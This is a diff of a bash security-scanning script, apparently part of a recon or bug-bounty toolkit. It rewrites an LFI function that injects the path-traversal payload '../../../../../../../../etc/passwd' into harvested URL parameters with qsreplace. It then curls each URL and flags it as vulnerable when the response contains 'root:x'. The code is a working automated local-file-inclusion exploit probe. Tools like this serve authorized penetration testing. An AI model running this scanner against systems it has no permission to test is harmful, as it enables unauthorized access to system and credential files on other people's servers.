@@ -190,30 +190,20 @@ function cors(){
 }
 
 ## LFI
-function lfi() {
-    script_dir="$(dirname "$0")"
-    payloads_file="$script_dir/lfi_payloads.txt"
+function lfi(){
     output="$results_path/lfi.txt"
     output_urls="$results_path/lfi_urls.txt"
     > "$output"
-    > "$output_urls"
     found=false
     printf "\n${bblue}[**]${reset} LFI ${bblue}[**]${reset}\n"
-
-    # Iterar sobre cada payload
-    while read -r payload; do
-        gf lfi < "$urls_output_path" | qsreplace "$payload" >> "$output_urls"
-    done < "$payloads_file"
-
-    # Verificar URLs
-    while read -r url; do
-        if curl --header "$headers" -s "$url" 2>&1 | grep -q "root:x"; then
+    gf lfi < "$urls_output_path" | qsreplace "../../../../../../../../etc/passwd" >> "$output_urls"
+    while read url; do 
+        if curl --header "$headers" -s "$url" 2>&1 | grep -q "root:x"; then 
             printf "${bred}VULN! $url${reset}\n" >> "$output"
             found=true
         fi
     done < "$output_urls"
-
-    if ! $found; then
+    if ! $found;then
         printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
     fi
 }
